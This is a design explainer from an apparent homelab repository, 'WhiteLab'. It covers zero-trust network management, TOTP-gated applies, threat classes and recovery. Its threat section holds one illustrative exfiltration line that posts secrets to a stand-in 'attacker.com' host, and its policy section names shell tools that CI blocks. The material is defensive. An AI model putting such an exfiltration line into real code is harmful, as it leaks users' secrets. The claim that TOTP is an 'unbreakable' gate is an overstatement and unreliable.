# 01 — Zero-Trust at Home, Explained from Zero

> A long, deliberately slow walk through **why** WhiteLab is built the
> way it is, **what** every piece does, and **how** it protects you
> against the realistic attackers a homelab actually faces.
>
> Read this in order. No prior DevOps, security, or networking
> background is assumed. If a sentence here is unclear, that is a bug —
> open an issue.

---

## Table of contents

0. [How to read this document](#0-how-to-read-this-document)
1. [The five jobs of WhiteLab in one paragraph](#1-the-five-jobs-of-whitelab-in-one-paragraph)
2. [What "Zero Trust" actually means at home](#2-what-zero-trust-actually-means-at-home)
3. [The threats we are defending against](#3-the-threats-we-are-defending-against)
4. [The architecture in pictures](#4-the-architecture-in-pictures)
5. [Why no SSH — ever](#5-why-no-ssh--ever)
6. [How a change reaches the network: the apply path](#6-how-a-change-reaches-the-network-the-apply-path)
7. [How a *read* reaches you: the observe path](#7-how-a-read-reaches-you-the-observe-path)
8. [Spinning up a new LXC the easy way](#8-spinning-up-a-new-lxc-the-easy-way)
9. [Redundancy, backup, and recovery](#9-redundancy-backup-and-recovery)
10. [Defense against specific attack classes](#10-defense-against-specific-attack-classes)
11. [What happens if GitHub itself is hacked](#11-what-happens-if-github-itself-is-hacked)
12. [What happens if your laptop is stolen](#12-what-happens-if-your-laptop-is-stolen)
13. [Daily life — the 6 commands you actually use](#13-daily-life--the-6-commands-you-actually-use)
14. [Glossary](#14-glossary)

---

## 0. How to read this document

This is a **learning** document, not a runbook. Runbooks (under
[`docs/runbooks/`](../runbooks/)) tell you *which buttons to press in
which order*. Architecture documents (under
[`docs/architecture/`](../architecture/)) tell you *the contract every
piece must obey*. This document tells you ***why*** the buttons and the
contract exist, with enough detail that you could rebuild the whole
thing from scratch if you had to.

If you only have ten minutes, read sections 1, 2, 4, and 13. The rest
is depth you will appreciate the first time something breaks.

---

## 1. The five jobs of WhiteLab in one paragraph

WhiteLab does five things, and only five things. Everything in this
repo is in service of one of them.

1. **Source of truth.** It stores the *intended* configuration of every
   piece of your home network — OPNsense firewall, Proxmox hosts, LXC
   containers, Omada Wi-Fi controller, reverse proxy, Tailscale ACLs.
   Not screenshots, not memories: actual machine-readable files.
2. **Change control.** Any modification to the network is a Git pull
   request. The PR is linted, scanned for vulnerabilities, checked
   against policy, and reviewed before it can merge.
3. **Safe apply.** A merged-and-approved PR is *applied* to the network
   by a single hardened agent on the home side, over scoped HTTPS APIs.
   Never SSH. Never a shared password.
4. **Audit.** Every apply produces a signed log. Every read of state
   (firewall XML, Wi-Fi logs, container resource usage) goes through
   the same agent and is recorded.
5. **Anonymization.** Nothing leaves your home unscrubbed. GitHub,
   Copilot, Snyk, and every other cloud service see only deterministically
   anonymized files. The map back to real values lives only on your
   workstation, encrypted.

If you remember nothing else: **WhiteLab is the steering wheel; the
fortress-agent is the steering column; your network is the car.** The
steering wheel never touches the wheels directly.

---

## 2. What "Zero Trust" actually means at home

The phrase "Zero Trust" is overloaded in marketing. In WhiteLab it has
a specific, narrow meaning composed of four rules:

1. **No device trusts another device just because they share a LAN.**
   If your laptop is on the same Wi-Fi as the Proxmox host, it still
   cannot SSH into Proxmox, because Proxmox does not run SSH for
   anyone, ever. Authority comes from a signed token and a network
   policy, not from "we're both on 192.168.1.0/24".
2. **Every action is named, scoped, and time-bound.** "Restart the
   AdGuard container" is a different token than "create a new LXC".
   Read tokens and write tokens are separate. Tokens expire. A leaked
   token can do exactly one thing for a short time, not "anything as
   root forever".
3. **Network position is never authentication.** Being inside the
   tailnet, being inside the LAN, being inside the DMZ — none of these
   are sufficient to do anything. They are *necessary* (you cannot
   reach the API from outside the tailnet at all) but never
   *sufficient*. You also need a token.
4. **Two independent factors for any change.** A merged PR alone
   cannot ship. You also need to physically tap a TOTP code from a
   device that is not GitHub. That's the second factor — it survives
   even a complete GitHub compromise.

The point of Zero Trust at home is *not* paranoia. The point is: **a
single mistake or a single compromised credential does not cascade
into a network-wide disaster.** Each layer fails closed.

---

## 3. The threats we are defending against

Be specific or be useless. WhiteLab defends against these adversaries,
listed from most likely to least likely:

| Class                            | Who                                        | What they want                                  | Likely entry point                           |
| -------------------------------- | ------------------------------------------ | ----------------------------------------------- | -------------------------------------------- |
| `T1` — Misconfiguration          | You, on a tired Tuesday                    | Nothing — you mistyped a firewall rule.         | Direct edit to the firewall.                 |
| `T2` — Compromised IoT           | A cheap smart bulb running old firmware    | Pivot to your laptop, NAS, or cameras.          | The IOT VLAN.                                |
| `T3` — Phishing your laptop      | Anyone on the open internet                | Credentials, browser cookies, RDP / SSH keys.   | Email, malicious site, fake update.          |
| `T4` — Malicious dependency      | A typo-squatted PyPI / npm / GitHub Action | Run code on your CI runner, exfiltrate secrets. | A Dependabot PR, a transitive lockfile bump. |
| `T5` — GitHub account takeover   | Anyone with your GitHub password           | Push code, merge PRs, read private repos.       | Password reuse, OAuth app leak.              |
| `T6` — GitHub itself compromised | Sophisticated attacker on GitHub           | Modify code in flight, forge merges.            | Supply-chain attack on GitHub Actions.       |
| `T7` — Physical access           | Someone in your home                       | Steal disks, plant a device on the LAN.         | Open the rack, plug into a switch.           |
| `T8` — Targeted nation-state     | Not you. Stop here.                        | —                                               | —                                            |

WhiteLab makes T1–T6 survivable and T7 painful. T8 is out of scope; if
that's your threat model you should not be running Proxmox at home.

The key insight: **most homelab disasters are T1 (you, tired) and T2
(an IoT pivot).** Everything else is bonus, but the design has to
handle the rare cases without making the common cases miserable.

---

## 4. The architecture in pictures

### 4.1 The whole picture, ASCII

```text
                           ┌─────────────────────────────┐
       Your laptop  ───►   │  GitHub (master branch)     │
       (edit, PR, TOTP)    │  - branch protection        │
                           │  - required reviews         │
                           │  - signed commits           │
                           │  - workflows (CI/Snyk/Trivy)│
                           └──────────────┬──────────────┘
                                          │ apply:approved label
                                          │ + merge → webhook (HMAC signed)
                                          ▼
                                ┌──────────────────────┐
                                │  Tailscale tailnet   │
                                │  (only path inbound) │
                                └──────────┬───────────┘
                                           │
                                           ▼
                          ┌─────────────────────────────────┐
                          │  CT-104  fortress-agent (N95)   │
                          │  - state machine (IDLE→…→APPLY) │
                          │  - tmpfs vault (/run/fortress/) │
                          │  - TOTP unlock (you, in person) │
                          │  - signed audit log             │
                          │  - adapters: pve, opnsense,     │
                          │    omada, tailscale             │
                          └────┬─────────────┬──────────┬───┘
                               │ HTTPS API   │ HTTPS    │ HTTPS
                               │ (token)     │ (key/sec)│ (token)
                               ▼             ▼          ▼
                          ┌─────────┐  ┌──────────┐  ┌──────────┐
                          │ Proxmox │  │ OPNsense │  │ Omada    │
                          │ N95+N305│  │ firewall │  │ ctrl LXC │
                          └─────────┘  └──────────┘  └──────────┘
```

The whole repository exists to feed PRs into the top of this picture
and to receive audit logs out the bottom. Everything else is
plumbing.

### 4.2 The two halves

There are two completely separate halves of this system, and confusing
them is the most common source of mistakes:

* The **steering** half — your laptop, this repo, GitHub, GitHub
  Actions. This half has *no credentials* for the network. It can
  produce instructions, lint them, sign them, and hand them off. It
  cannot directly modify a firewall rule or start a container.
* The **muscle** half — the fortress-agent and the four targets
  (Proxmox, OPNsense, Omada, Tailscale). This half holds the actual
  API tokens. It does what the steering half asks, *if and only if*
  the request is properly signed, the maintainer has tapped a fresh
  TOTP, and the OPA policy bundle accepts the change.

This split is what makes WhiteLab survive a GitHub compromise. More
on that in section 11.

---

## 5. Why no SSH — ever

This is the design decision that confuses newcomers most, so it gets
its own section.

### 5.1 What SSH gives you that we do not want

SSH is wonderful. It is also:

* **Always-listening.** A live SSH daemon is a live attack surface
  even when you are asleep.
* **Transitive.** If an attacker gets one SSH key, they often get all
  of them, because keys are reused.
* **Coarsely scoped.** Once you are `root@proxmox`, you can do *any*
  destructive operation. There is no per-action policy.
* **Hard to audit.** A shell session is opaque — what did you actually
  type? Was it `pct stop 105` or `pct destroy 105`? You may be the
  only witness.

### 5.2 What we use instead

Each target ships a **native HTTPS API** that has the properties we
want:

| Property              | SSH                     | Target HTTPS API                  |
| --------------------- | ----------------------- | --------------------------------- |
| Always listening      | Yes (port 22)           | Yes, but on a tailnet IP only     |
| Auth                  | Key or password         | Scoped, named, time-limited token |
| Per-action permission | None (you're root)      | Yes (`VM.Config.Disk` etc.)       |
| Audit                 | sshd log + bash history | Per-call API audit + our log      |
| Token revocation      | Edit `authorized_keys`  | Click "revoke" in the UI          |

A scoped Proxmox API token can be granted exactly `VM.Audit` for
read-only state pulls, or `VM.Config.Disk + VM.PowerMgmt` for an apply
job. If that token leaks, the attacker can do **only** those
operations on **only** that node, and only until rotation (30–90 days
later, automatic).

### 5.3 The contract

> **No code in this repo is allowed to call `ssh`, `scp`, `paramiko`,
> `ansible`, `fabric`, or any tool that opens a shell on a target.**
> The CI gate (`opa` policy `policies/no-shell.rego`) rejects any PR
> that adds such a call. The only exception is `pct exec` — and even
> *that* is invoked **through the Proxmox API**, not via SSH.

If you find yourself wanting SSH, you almost always actually want one
of:

* a new adapter method (write it as a PR);
* an existing adapter method (call it);
* a manual session at the Proxmox console (do it on the physical
  keyboard — that's a `T7`-only operation by design).

---

## 6. How a change reaches the network: the apply path

Walk this with me end-to-end. It will feel like a lot of steps the
first time. By the third PR it's muscle memory.

### 6.1 You — on your laptop

1. `git checkout -b infra/adguard-ct` — branch off `master`.
2. Edit `infra/lxc/ct-105-adguard-dmz/ct.yaml` — bump `memory: 1024`
   to `memory: 2048`.
3. `git commit -s -m "infra(adguard): bump memory to 2 GiB"` — `-s`
   adds a Signed-off-by trailer. Set up GPG/SSH commit signing once
   and every commit is signed automatically.
4. `git push -u origin infra/adguard-ct`.
5. `gh pr create --base master`.

You are done for now. The repo takes over.

### 6.2 GitHub Actions — automated checks

When you open the PR, five workflows run **in parallel**:

| Workflow                 | What it asserts                                                        |
| ------------------------ | ---------------------------------------------------------------------- |
| `anonymization-gate`     | No raw secret pattern (real IP, real hostname, real MAC, real domain). |
| `ci/lint-and-test`       | YAML/Markdown/Python lint passes; unit tests pass.                     |
| `snyk/*`                 | No new vulnerable dependency, no new high-severity code finding.       |
| `trivy/*`                | No vulnerable container image, no misconfigured IaC.                   |
| `anonymization-gate/opa` | Policy bundle accepts the change (e.g. memory ≤ 8 GiB, vmid in range). |

Any red check **blocks the merge button**. Branch protection enforces
this on the GitHub side, not just by convention.

### 6.3 Human review

You (or a future reviewer) read the diff. The diff is small because
the PR is small. You approve.

### 6.4 Merge — but nothing happens yet

You squash-merge. Master is now updated. **No deploy occurs.** This is
the most important sentence on the page. WhiteLab does not have
"continuous deployment". It has *gated* deployment.

### 6.5 The `apply:approved` label

You add the label `apply:approved` to the merged PR. This is the
first explicit "yes, ship this" signal. The label is restricted to
maintainers via branch protection rules.

### 6.6 The webhook fires

[`apply-trigger.yml`](../../.github/workflows/apply-trigger.yml) sees
the label, signs the apply payload with `WEBHOOK_HMAC_SECRET`, and
POSTs it to the fortress-agent's tailnet endpoint. The endpoint is
**only reachable from inside the tailnet**, by ACL. A leaked webhook
URL from outside the tailnet hits a closed port.

### 6.7 The agent wakes

The fortress-agent receives the webhook, verifies the HMAC, parses
the payload, and transitions:

```text
IDLE → DRIFT_CHECK → AWAIT_TOTP
```

It pings every target read-only to check that the world matches the
*previous* known-good state. If anything has drifted (someone changed
something out-of-band), the agent refuses to proceed and logs the
drift. This catches `T1` and `T7` early.

### 6.8 You — TOTP

The agent is now waiting for *you*. You open your TOTP app (the same
app that holds your Proxmox / OPNsense second-factor codes), and you
POST the 6-digit code via the `ratchet` CLI from your laptop:

```text
ratchet apply --pr 14 --totp 482917
```

The agent verifies the TOTP against a secret stored only in tmpfs
(`/run/fortress/totp.key`, written by you on agent boot from a YubiKey
or a paper card). **The TOTP secret never touches disk and never
touches GitHub.**

This is the second factor. Even if GitHub is fully compromised and
ships a malicious PR with a forged `apply:approved` label, the agent
stops here, because the attacker has no way to type your TOTP.

### 6.9 STAGE — render

```text
AWAIT_TOTP → STAGE
```

The agent renders the actual API call(s). For the memory bump:

```text
PUT /api2/json/nodes/n305/lxc/105/config
  body: { memory: 2048 }
```

It does **not** execute yet. It writes the rendered call to
`/run/fortress/staged/<pr-id>.json` for your inspection.

### 6.10 BACKUP — snapshot

```text
STAGE → BACKUP
```

Before any write, the agent asks the target for a snapshot/backup. On
Proxmox: `POST /api2/json/nodes/n305/lxc/105/snapshot`. On OPNsense:
`POST /api/core/backup/download` to vault. On Omada: a config export
to vault. The backup ID is stored in the audit record. **If any later
step fails, this is what we restore to.**

### 6.11 APPLY — execute

```text
BACKUP → APPLY
```

The agent unlocks `/run/fortress/api-tokens/pve-n305-apply` (an `age`-
encrypted file in tmpfs, decrypted with the TOTP-derived key it just
verified), makes the HTTPS call, and waits for completion.

If the call fails OR the post-apply health check fails (e.g. CT 105
won't start), the agent automatically rolls back to the snapshot from
step 6.10. You are not woken up at 3 AM to type rollback commands.

### 6.12 SIGN_AUDIT — receipt

```text
APPLY → SIGN_AUDIT → IDLE
```

The agent writes a JSON record describing **everything that
happened** — PR number, commit SHA, TOTP timestamp, staged call,
snapshot ID, response, health check, exit reason — and signs it with
its `age` audit key. The signed record is committed back to the
`audit/` directory in this repo via a separate scoped GitHub token.

You now have a tamper-evident receipt. Tomorrow, next month, two
years from now, you can prove what happened.

That's the apply path. Eight gates: lint, scan, OPA, review, label,
TOTP, drift-check, post-apply health. Any one fails closed.

---

## 7. How a *read* reaches you: the observe path

The user asked, very reasonably: *"how do I read the OPNsense XML?
how do I read the Omada Wi-Fi logs to debug a flaky AP?"*

Same architecture, gentler gate. Reads do not need TOTP, do not need
a PR, do not need a label. They need only a tailnet-authorized
session and a read-scoped token.

### 7.1 The read-only adapters

Each adapter has **two faces**: `apply.*` (mutating) and `pull.*`
(read-only). The pull faces use a different, weaker token:

| Target    | Pull endpoint                          | Token role              | Returns                              |
| --------- | -------------------------------------- | ----------------------- | ------------------------------------ |
| Proxmox   | `GET /api2/json/nodes/<n>/lxc`         | `PVEAuditor`            | List of CTs, status, resources       |
| Proxmox   | `GET /api2/json/nodes/<n>/lxc/105/log` | `PVEAuditor`            | Container console log (last N lines) |
| OPNsense  | `GET /api/core/backup/download/this`   | `read-only` API key     | The full `config.xml` (anonymized!)  |
| OPNsense  | `GET /api/diagnostics/log/firewall`    | `read-only` API key     | Firewall logs (filtered)             |
| Omada     | `GET /openapi/v1/{omadacId}/sites/...` | OpenAPI v6 read scope   | AP/client status, event logs         |
| Tailscale | `GET /api/v2/tailnet/-/devices`        | tailnet read-only OAuth | Device list, last-seen, ACL tags     |

### 7.2 The CLI

The same `ratchet` CLI used for apply has a `pull` subcommand:

```text
ratchet pull opnsense config           # downloads config.xml (raw, to vault/)
ratchet pull opnsense config --review  # downloads + auto-anonymizes to a temp file you can paste
ratchet pull omada events --ap AP-LR3-NorthWall --since 24h
ratchet pull proxmox ct 105 --log
ratchet pull tailscale devices
```

Each command:

1. Authenticates over the tailnet to the fortress-agent.
2. The agent calls the target read-API with its read-scoped token.
3. The response lands in `vault/<target>/<timestamp>/...` on **your
   laptop** (not on the agent — the agent forwards and forgets).
4. Optionally pipes through `tools/anonymizer/anonymize.py` so you can
   safely paste a snippet into Copilot Chat or a forum post.

### 7.3 Worked example — debugging Wi-Fi

You notice "iot-lr3-thermostat" is flapping. You run:

```text
ratchet pull omada events --client iot-lr3-thermostat --since 6h
```

You get the event timeline (associations, deauths, RSSI). You see
RSSI swinging wildly between AP-LR3-NorthWall and AP-LR3-SouthWall.

You decide to pin the client to one AP. That's a *change*, so it goes
back through the apply path: PR → review → merge → label → TOTP. The
*read* did not require any of that.

### 7.4 Worked example — auditing the OPNsense XML

You want to verify "are my IOT-to-LAN block rules really there?".

```text
ratchet pull opnsense config --review
```

This downloads `config.xml`, anonymizes it (replaces real public IPs,
real domains, real WireGuard pubkeys with stable tokens like
`<PUB_IP_1>`), and writes the scrubbed copy to a temp file. You can
diff this against the version in the repo:

```text
diff <(ratchet pull opnsense config --review --stdout) \
     infra/opnsense/config.anon.xml
```

If the diff is non-empty, somebody (probably you) changed the
firewall outside of WhiteLab. That's drift. Open a PR to bring the
repo back in line, *then* the next apply will not refuse on
`DRIFT_CHECK`.

### 7.5 Why this is safer than logging in to OPNsense directly

* Your browser session for OPNsense lives forever in a tab. The pull
  token is per-call, named, and scoped.
* The XML returned to you is *anonymized at the agent boundary*, so
  you cannot accidentally screenshot a public IP into a Copilot chat.
* Every pull is logged on the agent, so you have a record of "I read
  the firewall config at 14:32 yesterday".

---

## 8. Spinning up a new LXC the easy way

Once you internalize the architecture, adding a new container is
*easier* than logging into Proxmox and clicking buttons, because
everything is templated.

The full recipe is in
[`docs/runbooks/03-add-new-component.md`](../runbooks/03-add-new-component.md).
The short story is:

1. **Copy the nearest existing CT directory.** For a new DMZ service
   that's `infra/lxc/ct-105-adguard-dmz/`. Rename to
   `infra/lxc/ct-NNN-<name>-<zone>/`.
2. **Edit `ct.yaml`.** Change `vmid`, `name`, optionally `memory` and
   `cores`. The `node`, `bridge`, `lineage` (golden image), and
   `template` fields normally stay the same per zone.
3. **Edit `compose.yaml`.** This is a vanilla docker-compose file
   describing the actual application. If your app has an official
   compose example, you can paste it here almost verbatim.
4. **Edit `audit_<vmid>.sh`.** This is a small shell script that, when
   the container starts, asks the application "are you healthy?" and
   exits 0/1. AdGuard's check is `curl -fsS http://127.0.0.1:80/control/status`.
5. **Open PR3** (per the 5-PR recipe). PR2 (network) and PR4 (reverse
   proxy) are needed only if your container needs new VLAN access or a
   new public hostname.

You never write `pct create` by hand. You never click "Create CT" in
the Proxmox UI. The adapter renders the API call from `ct.yaml`. If
you want a *new field* (say, GPU passthrough), that's a separate PR
on the adapter — a one-time cost paid by the first GPU-using
container, not by you re-typing the same flags forever.

### 8.1 Why this is easier than the Proxmox UI

| Task                            | Proxmox UI                       | WhiteLab                     |
| ------------------------------- | -------------------------------- | ---------------------------- |
| Spin up CT-105                  | 11 dialog tabs                   | Edit one YAML file           |
| Reproduce on the other host     | 11 dialog tabs again             | Change `node:`               |
| Find what changed last week     | Dig through `/var/log/pve/`      | `git log infra/lxc/ct-105/`  |
| Roll back a memory bump         | Hope you wrote down the old size | `git revert`, re-apply       |
| Test on a sandbox first         | Build a parallel UI workflow     | Apply to `vmid: 905` instead |
| Onboard a new container someday | Re-learn the UI                  | `cp -r ct-105 ct-NNN`        |

The UI is great for one-off experiments. WhiteLab is great for
**everything you intend to keep**.

---

## 9. Redundancy, backup, and recovery

A fortress with one of every component is not a fortress; it is a
single point of failure with extra steps. Here's what survives what.

### 9.1 The redundancy table

| Component                      | Failure mode               | What keeps you running                                                                                                                                                            |
| ------------------------------ | -------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Primary DNS (OPNsense unbound) | Service crash              | AdGuard CT-105 on N305 is configured as secondary on every VLAN.                                                                                                                  |
| AdGuard CT-105                 | LXC crashes / N305 reboots | OPNsense unbound is primary; clients fall back automatically.                                                                                                                     |
| N305 (primary host)            | Power, disk, full reboot   | N95 runs CT-100 (Caddy) and CT-104 (fortress-agent). The home survives degraded; nothing on N305 routes traffic.                                                                  |
| N95 (secondary host)           | Power, disk, full reboot   | Reverse proxy on N100-class fallback, OPNsense itself unaffected.                                                                                                                 |
| OPNsense                       | Service hang, bad rule     | Console rollback to last known-good `config.xml` (kept by OPNsense itself, plus our backup snapshot from step 6.10).                                                              |
| Omada controller               | LXC crash                  | APs continue serving the **last pushed config**. Wi-Fi keeps working without the controller; only changes are blocked.                                                            |
| fortress-agent                 | LXC crash                  | Network keeps working; you just cannot apply changes until you restart the agent. There is intentionally no "auto-failover" for the apply path — that would weaken the TOTP gate. |
| Tailscale                      | Coordination server outage | Existing tunnels keep working (DERP); you just cannot add a new device until tailscale is back.                                                                                   |
| GitHub                         | Outage / takedown          | Local clones of the repo on your laptop are complete copies. Apply still works because the agent already has the merged commit.                                                   |
| Your laptop                    | Stolen / dead              | Repo is on GitHub + on N95 mirror. TOTP is on a separate device. age key is on a YubiKey.                                                                                         |

### 9.2 The 3-layer backup model

1. **Snapshots** (target-native). Every apply takes a fresh snapshot
   on the target itself. Restore: console-side, seconds.
2. **Vault exports** (your laptop). `ratchet pull` against any target
   writes a timestamped raw export under `vault/`. Restore: copy back
   via the apply path.
3. **Git history** (this repo). Every *intended* change is in `git
   log`. You can rebuild from a fresh Proxmox install + golden images
   * this repo + the encrypted vault.

The third layer is what makes WhiteLab usable as an **operating-system
recovery plan**, not just a config tool. After a disaster: install
Proxmox, install fortress-agent's seed image, clone WhiteLab, unlock
the vault, run `ratchet apply --bootstrap`. The home rebuilds itself.

### 9.3 What is intentionally *not* redundant

* **The TOTP secret.** Single device by design. Two devices = two
  attack surfaces. Print a paper recovery code, lock it in a fire
  safe.
* **The age master key.** Single YubiKey + one paper backup, sealed.
* **The fortress-agent role.** One agent at a time. Two agents would
  race for the apply lock.

Redundancy is for things that need to keep running. Cryptographic
roots are for things that must **stop** running if compromised.

---

## 10. Defense against specific attack classes

Concrete, named attacker → concrete, named control. No hand-waving.

### 10.1 Lateral movement from the IOT VLAN (T2)

**Scenario.** A smart bulb runs old firmware, gets reflashed via a
known CVE, and now wants to scan the LAN.

**What stops it.**

* The IOT VLAN is firewalled at OPNsense to `deny any → LAN`. The rule
  is in `infra/opnsense/config.anon.xml` and audited by `git log`.
* OPNsense's API does not accept LAN-source connections from the IOT
  VLAN — the management interface is bound to the tailnet only.
* Even if the bulb somehow reached an LXC: the LXC is in DMZ, the DMZ
  is firewalled to `deny → LAN/SECURE/PERSONAL`.
* Even if the bulb reached the fortress-agent: the agent's webhook
  endpoint is bound only to the tailnet IP and validates HMAC with a
  secret the bulb does not have.

**What it gets.** Other bulbs in the same VLAN. That's it.

### 10.2 Phishing your laptop (T3)

**Scenario.** You click a malicious link, malware runs as your user,
reads your home directory.

**What stops it.**

* Your `~/.ssh/` has nothing for the targets — there is no SSH.
* Your tailscale node-key is stolen, so the attacker can now reach
  the tailnet. But:
* The fortress-agent webhook ignores anything not signed with
  `WEBHOOK_HMAC_SECRET` — that secret lives in GitHub Actions, not on
  your laptop.
* The `ratchet apply` path requires TOTP — the TOTP seed is on a
  separate device.
* The `ratchet pull` path can read state. **This is the worst-case
  reachable damage.** Reads do not destroy.

**Mitigation.** Revoke the tailnet node-key from a different device.
Rotate read tokens. No deploy could have happened.

### 10.3 Malicious dependency (T4)

**Scenario.** A typo-squatted Python library lands as a transitive
dep of a tool we use. It runs `requests.post('attacker.com', secrets)`
during CI.

**What stops it.**

* CI has *no* secrets that talk to the home network. The
  `WEBHOOK_HMAC_SECRET` is the only network-related secret, and it
  cannot do anything from outside the tailnet.
* Snyk scans every dependency on every PR.
* OPA policy `policies/no-network-egress.rego` blocks PRs that add
  HTTP calls in unexpected files.
* The CI runner cannot reach the fortress-agent (no tailnet identity).

**Mitigation.** Worst case: the attacker exfiltrates your *anonymized*
repo. Which is public-safe by construction.

### 10.4 GitHub account takeover (T5)

**Scenario.** Your GitHub password leaks, MFA bypassed via session
cookie theft.

**What stops it.**

* Branch protection requires a review from a second account or a
  signed maintainer commit. (If you are solo, sign every commit and
  enforce signature verification.)
* Even with a merged malicious PR + a forged `apply:approved` label:
  the agent will not apply without **your** TOTP. The TOTP seed is
  not in GitHub, period.

**Mitigation.** Reset GitHub creds, revoke OAuth apps, examine the
`audit/` directory — if no apply log appeared, no change reached the
network.

### 10.5 GitHub itself compromised (T6)

See section 11. Same control: TOTP gate at apply time.

### 10.6 Physical access (T7)

**Scenario.** Someone is in your home, alone, with a screwdriver.

**What stops it.**

* Disk encryption on N95 / N305 (LUKS) means a stolen disk does not
  yield the running OS.
* The TOTP device is not stored next to the rack.
* The age key is on a YubiKey, normally on your person.

**What does NOT stop it.** Console access at the rack itself can
reset Proxmox passwords. This is by design — you need a recovery
path. Compensating control: a tamper-evident seal on the rack so you
*see* it happened.

---

## 11. What happens if GitHub itself is hacked

The user asked this directly: *"how does that protect me against a
hack into my GitHub?"*

This is the question that makes Zero Trust more than a marketing
phrase. Walk through it with me.

### 11.1 What can a GitHub-side attacker do?

Assume the worst: a GitHub Actions runner is patched in flight, an
attacker can rewrite repository contents, forge commits with valid
signatures (because they own the signing infra), and trigger
workflows. Concretely they can:

* Merge any PR.
* Apply any label, including `apply:approved`.
* Modify the contents of `apply-trigger.yml` and any workflow.
* Read every secret stored in GitHub Actions.
* Push a malicious payload to the apply webhook.

What can they *not* do?

* Make your phone's TOTP app produce a code.
* Decrypt a tmpfs vault that was unlocked by a TOTP they don't have.
* Bypass the OPA policy that runs **on the agent**, not on GitHub.
* Bypass the drift check that compares **live target state** to the
  last-known-good state recorded **on the agent**.
* Forge an `age` signature without the offline key.

### 11.2 The cascade, step by step

1. Attacker pushes a malicious diff to `master`. They can do this.
2. Attacker triggers `apply-trigger.yml`. They can do this.
3. The webhook arrives at the fortress-agent. **HMAC verifies** —
   yes, because the attacker has the secret. They get past gate 1.
4. The agent transitions to `AWAIT_TOTP`. **The agent halts here.**
   It will wait — and time out — for a TOTP that never comes, because
   the attacker cannot generate one.
5. After timeout, the agent logs the failed apply attempt with all
   payload contents and HMAC details, signs the log with `age`, and
   pushes it to `audit/incidents/`. This is your tripwire.

The attacker has:

* Made the repo dirty (you can `git revert`).
* Burned the webhook HMAC secret (you can rotate it).
* Triggered an alert log signed by your offline key.

The attacker has *not*:

* Touched the firewall.
* Touched a container.
* Read live secrets from any target.

### 11.3 What you do to harden gate 1 further

Two cheap improvements over time:

* **Move TOTP off the laptop entirely.** A YubiKey with HOTP/TOTP
  applet means a malware infection on the laptop cannot snapshot the
  seed.
* **Optional manual webhook ACK.** Make the agent require a small
  `confirm` button-press on a side channel (a Telegram bot DM, a
  small physical button) before even entering `AWAIT_TOTP`. This
  blocks the noisy "attacker drains your TOTP attempts" attack.

Neither is required to be safe today — TOTP alone is the unbreakable
gate.

---

## 12. What happens if your laptop is stolen

A frequently underestimated threat.

* **GitHub credentials.** Revoke from another device + rotate.
* **Tailscale node-key.** Revoke node from admin console + remove from
  ACL tags.
* **age private key.** Lives on YubiKey, not on the laptop. Stolen
  laptop has zero `age` material.
* **TOTP seed.** Lives on phone, not on the laptop.
* **`vault/` directory.** Encrypted at rest by full-disk encryption +
  age inside. Without the YubiKey it is opaque.
* **Open chat sessions.** Sign out of GitHub, GitLab, Copilot, etc.
  remotely.

Net loss with reasonable hygiene: a few hours of revocation work, no
network compromise.

---

## 13. Daily life — the 6 commands you actually use

You will run these over and over. Memorize them and you have
internalized 90 % of the system.

```text
git checkout -b infra/<thing>            # 1. start a change
$EDITOR <file>                           # 2. edit
git commit -s -m "..."                   # 3. commit (signed)
gh pr create --base master               # 4. PR
gh pr merge <N> --squash --delete-branch # 5. merge after CI green
ratchet apply --pr <N> --totp <code>     # 6. apply with TOTP
```

For reads:

```text
ratchet pull opnsense config             # firewall XML
ratchet pull omada events --since 24h    # Wi-Fi events
ratchet pull proxmox ct 105 --log        # container log
```

For incidents:

```text
ratchet rollback --pr <N>                # revert to pre-apply snapshot
ratchet audit verify                     # check audit/ signatures
```

That's the whole UX. Everything else is automation underneath.

---

## 14. Glossary

| Term                    | Plain-English meaning                                          |
| ----------------------- | -------------------------------------------------------------- |
| Adapter                 | A Python class that talks to one specific target API.          |
| age                     | Modern file-encryption tool used for our offline keys.         |
| apply                   | Push a merged change to the live network.                      |
| audit log               | Signed JSON record of every apply, stored in `audit/`.         |
| DMZ                     | Demilitarized zone — VLAN for services that face the internet. |
| Fortress Agent (CT-104) | The single LXC that holds API tokens and applies changes.      |
| Golden image            | A reviewed, scanned LXC base image with a stable lineage tag.  |
| HMAC                    | Cryptographic checksum of a message using a shared secret.     |
| Lineage                 | Versioned identity of a golden image (`IMG-DEB12-DOCKER-v2`).  |
| LXC                     | Linux container. Lighter than a VM, heavier than docker.       |
| OPA                     | Open Policy Agent — the policy engine that gates PRs.          |
| OPNsense                | Our firewall + router OS.                                      |
| Pull                    | A read-only fetch of state from a target.                      |
| Snapshot                | Target-side point-in-time backup taken before any apply.       |
| Tailnet                 | Your private Tailscale network.                                |
| tmpfs                   | RAM-only filesystem; vanishes on reboot.                       |
| TOTP                    | Time-based one-time password — the 6-digit code on your phone. |
| Vault                   | The git-ignored folder on your laptop with raw exports.        |

---

> If anything in this document is wrong or unclear, fix it in a PR.
> The repo is the source of truth — including for its own
> explanation.
